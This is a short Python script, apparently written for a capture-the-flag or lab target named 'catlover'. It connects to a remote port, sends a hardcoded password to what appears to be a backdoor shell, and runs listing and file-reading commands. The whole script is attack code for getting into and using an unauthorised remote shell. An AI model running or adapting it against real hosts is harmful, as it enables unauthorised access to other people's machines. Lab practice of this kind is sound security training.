#!/usr/bin/env python3
import socket
import time

TARGET = "10.66.171.218"
PORT = 4420
PASS = "sardinethecat"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((TARGET, PORT))

# Read banner
data = s.recv(4096).decode()
print("[*]", data.strip())

# Send password
s.send((PASS + "\n").encode())
time.sleep(1)
data = s.recv(4096).decode()
print("[*]", data.strip())

# Send commands
cmds = ["ls /home/catlover", "ls bin", "ls usr/bin", "cat /home/catlover/runme 2>/dev/null | head -c 100"]
for cmd in cmds:
    s.send((cmd + "\n").encode())
    time.sleep(1)
    try:
        data = s.recv(4096).decode()
        print(f"[>] {cmd}")
        print(data)
    except socket.timeout:
        print(f"[!] No response for: {cmd}")

s.close()
